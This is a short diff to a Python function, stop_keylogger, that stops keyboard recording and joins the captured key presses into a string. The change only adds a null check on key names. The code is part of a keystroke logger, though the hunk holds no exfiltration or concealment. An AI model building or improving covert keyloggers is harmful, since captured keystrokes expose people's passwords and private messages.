@@ -17,6 +17,6 @@ def stop_keylogger() -> str:
         return 'Keylogger not running'
     _recording = False
     events = keyboard.stop_recording()
-    chars = (_SPECIAL.get(e.name) or (e.name if len(e.name) == 1 else '')
+    chars = (_SPECIAL.get(e.name) or (e.name if e.name and len(e.name) == 1 else '')
              for e in events if e.event_type == keyboard.KEY_DOWN)
     return ''.join(chars)
